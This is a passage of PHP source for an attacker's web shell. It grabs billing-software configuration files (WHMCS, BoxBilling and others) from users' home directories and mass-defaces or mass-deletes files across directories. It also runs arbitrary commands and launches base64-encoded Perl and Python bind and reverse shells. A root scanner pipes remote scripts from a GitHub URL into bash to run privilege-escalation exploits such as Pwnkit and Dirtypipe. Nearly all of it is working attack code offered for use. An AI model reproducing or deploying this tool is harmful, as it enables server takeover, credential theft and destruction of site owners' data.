							"/home/$shizuo/manage/submitticket.php" => "WHMCS",
							"/home/$shizuo/CLIENTSUPPORT/submitticket.php" => "WHMCS",
							"/home/$shizuo/ClientSupport/submitticket.php" => "WHMCS",
							"/home/$shizuo/Clientsupport/submitticket.php" => "WHMCS",
							"/home/$shizuo/clientsupport/submitticket.php" => "WHMCS",
							"/home/$shizuo/CHECKOUT/submitticket.php" => "WHMCS",
							"/home/$shizuo/Checkout/submitticket.php" => "WHMCS",
							"/home/$shizuo/checkout/submitticket.php" => "WHMCS",
							"/home/$shizuo/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$shizuo/Billings/submitticket.php" => "WHMCS",
							"/home/$shizuo/billings/submitticket.php" => "WHMCS",
							"/home/$shizuo/BASKET/submitticket.php" => "WHMCS",
							"/home/$shizuo/Basket/submitticket.php" => "WHMCS",
							"/home/$shizuo/basket/submitticket.php" => "WHMCS",
							"/home/$shizuo/SECURE/submitticket.php" => "WHMCS",
							"/home/$shizuo/Secure/submitticket.php" => "WHMCS",
							"/home/$shizuo/secure/submitticket.php" => "WHMCS",
							"/home/$shizuo/SALES/submitticket.php" => "WHMCS",
							"/home/$shizuo/Sales/submitticket.php" => "WHMCS",
							"/home/$shizuo/sales/submitticket.php" => "WHMCS",
							"/home/$shizuo/BILL/submitticket.php" => "WHMCS",
							"/home/$shizuo/Bill/submitticket.php" => "WHMCS",
							"/home/$shizuo/bill/submitticket.php" => "WHMCS",
							"/home/$shizuo/PURCHASE/submitticket.php" => "WHMCS",
							"/home/$shizuo/Purchase/submitticket.php" => "WHMCS",
							"/home/$shizuo/purchase/submitticket.php" => "WHMCS",
							"/home/$shizuo/ACCOUNT/submitticket.php" => "WHMCS",
							"/home/$shizuo/Account/submitticket.php" => "WHMCS",
							"/home/$shizuo/account/submitticket.php" => "WHMCS",
							"/home/$shizuo/USER/submitticket.php" => "WHMCS",
							"/home/$shizuo/User/submitticket.php" => "WHMCS",
							"/home/$shizuo/user/submitticket.php" => "WHMCS",
							"/home/$shizuo/CLIENTS/submitticket.php" => "WHMCS",
							"/home/$shizuo/Clients/submitticket.php" => "WHMCS",
							"/home/$shizuo/clients/submitticket.php" => "WHMCS",
							"/home/$shizuo/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$shizuo/Billings/submitticket.php" => "WHMCS",
							"/home/$shizuo/billings/submitticket.php" => "WHMCS",
							"/home/$shizuo/MY/submitticket.php" => "WHMCS",
							"/home/$shizuo/My/submitticket.php" => "WHMCS",
							"/home/$shizuo/my/submitticket.php" => "WHMCS",
							"/home/$shizuo/secure/whm/submitticket.php" => "WHMCS",
							"/home/$shizuo/secure/whmcs/submitticket.php" => "WHMCS",
							"/home/$shizuo/panel/submitticket.php" => "WHMCS",
							"/home/$shizuo/clientes/submitticket.php" => "WHMCS",
							"/home/$shizuo/cliente/submitticket.php" => "WHMCS",
							"/home/$shizuo/support/order/submitticket.php" => "WHMCS",
							"/home/$shizuo/bb-config.php" => "BoxBilling",
							"/home/$shizuo/boxbilling/bb-config.php" => "BoxBilling",
							"/home/$shizuo/box/bb-config.php" => "BoxBilling",
							"/home/$shizuo/host/bb-config.php" => "BoxBilling",
							"/home/$shizuo/Host/bb-config.php" => "BoxBilling",
							"/home/$shizuo/supportes/bb-config.php" => "BoxBilling",
							"/home/$shizuo/support/bb-config.php" => "BoxBilling",
							"/home/$shizuo/hosting/bb-config.php" => "BoxBilling",
							"/home/$shizuo/cart/bb-config.php" => "BoxBilling",
							"/home/$shizuo/order/bb-config.php" => "BoxBilling",
							"/home/$shizuo/client/bb-config.php" => "BoxBilling",
							"/home/$shizuo/clients/bb-config.php" => "BoxBilling",
							"/home/$shizuo/cliente/bb-config.php" => "BoxBilling",
							"/home/$shizuo/clientes/bb-config.php" => "BoxBilling",
							"/home/$shizuo/billing/bb-config.php" => "BoxBilling",
							"/home/$shizuo/billings/bb-config.php" => "BoxBilling",
							"/home/$shizuo/my/bb-config.php" => "BoxBilling",
							"/home/$shizuo/secure/bb-config.php" => "BoxBilling",
							"/home/$shizuo/support/order/bb-config.php" => "BoxBilling",
							"/home/$shizuo/includes/dist-configure.php" => "Zencart",
							"/home/$shizuo/zencart/includes/dist-configure.php" => "Zencart",
							"/home/$shizuo/products/includes/dist-configure.php" => "Zencart",
							"/home/$shizuo/cart/includes/dist-configure.php" => "Zencart",
							"/home/$shizuo/shop/includes/dist-configure.php" => "Zencart",
							"/home/$shizuo/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/hostbills/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/host/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/Host/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/supportes/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/support/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/hosting/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/cart/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/order/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/client/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/clients/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/cliente/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/clientes/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/billing/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/billings/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/my/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/secure/includes/iso4217.php" => "Hostbills",
							"/home/$shizuo/support/order/includes/iso4217.php" => "Hostbills");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("shizuo_CONFIG/$shizuo-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a style='text-decoration:none;color:white;' href='?path=$path/shizuo_CONFIG'><font>Click Here</font></a></center>";
		}
		// adminer
		if($_7['id'] == 'adminer'){
			echo "<center class='anu'>Get Adminer<br>";
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href='$full/adminer.php' target='_blank'>Click Here</a></gr></center>";
	} else {
		if(adminer("","adminer.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href='$full/adminer.php' target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create adminer:(</rd>";}
		} echo "</center>";
	}
		// mass deface
		if($_7['id'] == 'deface'){
		function mass_all($dir,$namefile,$contents_sc) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$▚ = $dirc.'/'.$namefile;
				if($dirb === '.') {
					file_put_contents($▚, $contents_sc);
				} elseif($dirb === '..') {
					file_put_contents($▚, $contents_sc);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
							file_put_contents($▚, $contents_sc);
							$▟ = mass_all($dirc,$namefile,$contents_sc);
							}
						}
					}
				}
			}
		}
		function mass_onedir($dir,$namefile,$contents_sc) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$▚ = $dirc.'/'.$namefile;
					if($dirb === '.') {
						file_put_contents($▚, $contents_sc);
					} elseif($dirb === '..') {
						file_put_contents($▚, $contents_sc);
					} else {
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
								file_put_contents($▚, $contents_sc);
							}
						}
					}
				}
			}
		}
		if($_7['start']) {
			if($_7['tipe'] == 'mass') {
			mass_all($_7['d_dir'], $_7['d_file'], $_7['script']);
			} elseif($_7['tipe'] == 'onedir') {
			mass_onedir($_7['d_dir'], $_7['d_file'], $_7['script']);
			}
		}
		s();
		echo '<center class="anu">Mass Deface</center>';
		echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'> Select Type:
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
				<label class='form-check-label' for='flexCheckDefault'>One directory</label>
			</div>
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
				<label class='form-check-label' for='flexCheckDefault'>All directory</label>
			</div>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm text-dark' type='text' name='d_dir' value='$dir'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='README.txt'>
				<i class='bi bi-file-earmark'></i> Your Script:
				<textarea class='form-control btn-sm text-dark' rows='7' name='script' placeholder='Hacked by shizuo'></textarea>
				<div class='d-grid gap-2'>
					<input class='btn btn-dark btn-sm' type='submit' name='start' value='Deface!'>
				</div>
			</form>
		</div>";
		}
		// mass delete
		if($_7['id'] == 'delete'){
		function mass_delete($dir,$namefile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$▚ = $dirc.'/'.$namefile;
				if($dirb === '.') {
					if(file_exists("$dir/$namefile")) {
						unlink("$dir/$namefile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namefile")) {
						unlink("".dirname($dir)."/$namefile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($▚)) {
								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
								unlink($▚);
								$▟ = mass_delete($dirc,$namefile);
								}
							}
						}
					}
				}
			}
		}
		if($_7['start']) {
			mass_delete($_7['d_dir'], $_7['d_file']);
		}
		s();
		echo '<center class="anu">Mass Delete</center>';
		echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm text-dark' type='text' name='d_dir' value='$dir' $_r>
					<i class='bi bi-file-earmark'></i> Filename:
				<div class='input-group'>
					<input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='filename' $_r><br>
					<div class='input-group-append'>
						<input class='btn btn-dark btn-sm' type='submit' name='start' value='Delete!'>
					</div>
				</div>
			</form>
		</div>";
		}
		// phpinfo 
		//if($_7['id'] == 'phpinfo'){
			//@ob_start();
			//@eval("phpinfo();");
			//$buff = @ob_get_contents();
			//@ob_end_clean();	
			//$front = strpos($buff,"<body>")+6;
			//$end = strpos($buff,"</body>");
			//echo "<pre class='php_info'>".substr($buff,$front,$front-$front)."</pre>";
			//exit;
		//}
		// network
		if($_7['id'] == 'network'){
		s();
		echo '<center class="anu">Network</center>';
		echo "
		<div class='card text-dark'>
			<div class='card-header'>
				<form method='post'>
					Bind port to /bin/sh [perl]<br>
					Port:
				<div class='input-group'>
					<input class='form-control btn-sm text-dark' type='text' name='port' placeholder='1337'>
					<input class='btn btn-dark btn-sm' type='submit' name='bpl' value='Submit!'>
				</div>
			Back Connect<br>
			Server:
				<input class='form-control btn-sm text-dark' type='text' name='server' placeholder='".$_SERVER['REMOTE_ADDR']."'>
			Port:
			<div class='input-group'>
				<input class='form-control btn-sm text-dark' type='text' name='port' placeholder='1337'>
				<select class='form-control btn-sm text-dark' name='bc'>
					<option value='perl'>perl</option>
					<option value='python'>python</option>
				</select>
			</div>
			<div class='d-grid gap-2'>
				<input class='btn btn-dark btn-sm btn-block' type='submit' value='Submit!'>
			</div>
		</form>";
		if($_7['bpl']){
			$bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
			$brt = @fopen('bp.pl','w');
			fwrite($brt,$bp);
			$out = exe("perl bp.pl ".$_7['port']." 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre>$outn".exe("ps aux | grep bp.pl")."</pre>";
			unlink("bp.pl");
		}
		if($_7['bc'] == 'perl'){
			$bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
			$plbc = @fopen('bc.pl','w');
			fwrite($plbc,$bc);
			$out = exe("perl bc.pl ".$_7['server']." ".$_7['port']." 1>/dev/null 2>&1 &");
			sleep(1);
			echo "<pre>$outn".exe("ps aux | grep bc.pl")."</pre>";
			unlink("bc.pl");
		}
		if($_7['bc'] == 'python'){
			$bc_py = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
			$pbc_py = @fopen('bcpy.py','w');
			fwrite($pbc_py,$bc_py);
			$out_py = exe("python bcpy.py ".$_7['server']." ".$_7['port']);
			sleep(1);
			echo "<pre>$out_pyn".exe("ps aux | grep bcpy.py")."</pre>";
			unlink("bcpy.py");
			}
			echo "</div>
			</div>
		<br/>";
		}
		// console
		if($_7['id'] == 'cmd') {
		s();
		echo '<center class="anu">Command</center>';
		if(!empty($_POST['cmd'])) {
			$cmd = exe($_POST['cmd'].' 2>&1');
		}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<div class='input-group mb-3'>
					<input class='form-control btn-sm text-dark' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='whoami' $_r>
					<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
				</div>
			</form>";
			if($cmd):
			echo '
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;">$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
				</div>
			</div>';
			elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
			echo '
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;"><code>No result</code></pre>
				</div>
			</div>
		</div>';
		endif;
		}
		// multiple file upload
		if($_7['id'] == 'upload'){
		s();
		echo '<center class="anu">Upload (Multiple File Upload)</center>';
		if(isset($_7['upl'])){
			$result = count($_FILES['file']['name']);
			for($contents=0;$contents<$result;$contents++){
				$namefile = $_FILES['file']['name'][$contents];
					$up = @copy($_FILES['file']['tmp_name'][$contents],"$path/".$namefile);
				}
				if($result < 2){
					if($up){
					echo "<strong>Upload</strong> $namefile OK! ".ok()."</div>";
				}else{
				echo '<strong>Upload</strong> FAIL! '.er().'</div>';
				}
			}else{
			echo "<strong>Upload</strong> $result OK! ".ok()."</div>";
			}
		}
		echo "
		<div class='card card-body text-dark input-group mb-3'>
		Multiple File Upload
			<form method='POST' enctype='multipart/form-data'>
				<div class='input-group'>
					<input class='form-control form-control-sm text-dark' type='file' name='file[]' multiple='' $_r>
					<input class='btn btn-dark btn-sm' type='submit' name='upl' value='Go!'>
				</div>
			</form>
		</div>";
			}
		}
		// scanner root
		if (isset($_GET['dir']) && $_GET['id'] == "scanroot") {
			ob_implicit_flush();ob_end_flush();s();
			echo '<center class="anu">Scan Root by shizuo</center>';
			echo "
			<div class='text-center'>
				<div class='btn-group mb-3'>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=autoscan><i class='bi bi-bug'></i> Auto Scan </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=scansd><i class='bi bi-search'></i> Scan SUID </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=esg><i class='bi bi-search'></i> Exploit Suggester </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=autoscan2><i class='bi bi-bug'></i> Auto Scan v2 </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=scansd2><i class='bi bi-search'></i> Scan SUID v2 </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=esg2><i class='bi bi-search'></i> Exploit Suggester v2 </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=lpesh><i class='bi bi-bug'></i> CVE-2022-37706 LPE </a>
					<a class='btn btn-outline-light btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=lpesh2><i class='bi bi-bug'></i> CVE-2022-37706 LPE v2</a>
				</div>
			</div>";
			if (!function_exists("proc_open")) {
				echo "<center class='anu'>Command is Disabled!</center>";
			}
			if (!is_writable($path)) {
				echo "<center class='anu'>Current Directory is Unwriteable!</center>";
			}
			if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
				if (!file_exists($path."/shizuorooting/")) {
					mkdir($path."/shizuorooting");
					exe_root("curl https://raw.githubusercontent.com/newbee1337/shizuos-minishell/main/tools/auto.tar.gz -o auto.tar.gz", $path."/shizuorooting");
					exe_root("tar -xf auto.tar.gz", $path."/shizuorooting");
					if (!file_exists($path."/shizuorooting/netfilter")) {
						die("<center class='anu'>Failed to Download Material !</center>");
					}
				}
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>Netfilter : '.exe_root("timeout 10 ./shizuorooting/netfilter", $path).'Ptrace : '.exe_root("echo id | timeout 10 ./shizuorooting/ptrace", $path).'Sequoia : '.exe_root("timeout 10 ./shizuorooting/sequoia", $path).'OverlayFS : '.exe_root("echo id | timeout 10 ./overlayfs", $path."/shizuorooting").'Dirtypipe : '.exe_root("echo id | timeout 10 ./shizuorooting/dirtypipe /usr/bin/su", $path).'Sudo : '.exe_root("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe_root("echo id | timeout 10 ./pwnkit", $path."/shizuorooting").''.exe_root("rm -rf shizuorooting", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "scansd") {
				echo '<center class="anu">Please wait..</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("find / -perm -u=s -type f 2>/dev/null", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "esg") {
				echo '<center class="anu">Please wait..</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("curl -Lsk https://raw.githubusercontent.com/newbee1337/shizuos-minishell/main/tools/esg.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan2") {
				if (!file_exists($path."/shizuorooting/")) {
					mkdir($path."/shizuorooting");
					exe("curl https://raw.githubusercontent.com/newbee1337/shizuos-minishell/main/tools/auto.tar.gz -o auto.tar.gz", $path."/shizuorooting");
					exe("tar -xf auto.tar.gz", $path."/shizuorooting");
					if (!file_exists($path."/shizuorooting/netfilter")) {
						die("<center class='anu'>Failed to Download Material!</center>");
					}
				}
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>Netfilter : '.exe("timeout 10 ./shizuorooting/netfilter", $path).'Ptrace : '.exe("echo id | timeout 10 ./shizuorooting/ptrace", $path).'Sequoia : '.exe("timeout 10 ./shizuorooting/sequoia", $path).'OverlayFS : '.exe("echo id | timeout 10 ./overlayfs", $path."/shizuorooting").'Dirtypipe : '.exe("echo id | timeout 10 ./shizuorooting/dirtypipe /usr/bin/su", $path).'Sudo : '.exe("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe("echo id | timeout 10 ./pwnkit", $path."/shizuorooting").''.exe("rm -rf shizuorooting", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "scansd2") {
				echo '<center class="anu">Please wait..</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe("find / -perm -u=s -type f 2>/dev/null", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "esg2") {
				echo '<center class="anu">Please wait..</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe("curl -Lsk https://raw.githubusercontent.com/newbee1337/shizuos-minishell/main/tools/esg.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "lpesh") {
				echo '<center class="anu">Please wait..</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("curl -Lsk https://raw.githubusercontent.com/newbee1337/shizuos-minishell/main/tools/lpe.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "lpesh2") {
				echo '<center class="anu">Please wait..</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe("curl -Lsk https://raw.githubusercontent.com/newbee1337/shizuos-minishell/main/tools/lpe.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			}
		}


		// openfile
		if(isset($_7['opn'])) {
			$file = $_7['opn'];
		}	
		// view
		if($_7['action'] == 'view') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<div class='bg-dark'>
			<div class='container-fluid language-javascript'>
				<textarea rows='10' class='form-control' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>
			</div>
		</div>";
		}
		// edit
		if(isset($_7['edit_file'])) {
			$updt = fopen("$file", "w");
			$result = fwrite($updt, $_7['contents']);		
			if ($result) {
		echo '<strong>Edit file</strong> OK! '.ok().'</div>';
			}else{
		echo '<strong>Edit file</strong> FAIL! '.er().'</div>';
			}
		}
		if($_7['action'] == 'edit') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<textarea class='form-control btn-sm' rows='10' name='contents' $_r>".htmlspecialchars(file_get_contents($file))."</textarea>
			<div class='d-grid gap-2'><br>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='edit_file'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		//rename folder
		if($_7['action'] == 'rename_folder') {
			if($_7['r_d']) {
				$r_d = rename($dir, "".dirname($dir)."/".htmlspecialchars($_7['r_d'])."");
				if($r_d) {
		echo '<strong>Rename folder</strong> OK! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}else{
		echo '<strong>Rename folder</strong> FAIL! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		s();
		echo "
		<div class='btn-group'>
			<a class='btn btn-outline-dark btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
		</div>
		<br>
			<i class='bi bi-folder-fill'></i>:&nbsp;".basename($dir)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' value='".basename($dir)."' name='r_d' $_r>
				<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>";
		}
		//rename file
		if(isset($_7['r_f'])) {
			$old = $file;
			$new = $_7['new_name'];
			rename($new, $old);
			if(file_exists($new)) {
		echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
			<strong>Rename file</strong> name already in use! <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
		</div>';
			}else{
		if(rename($old, $new)) {
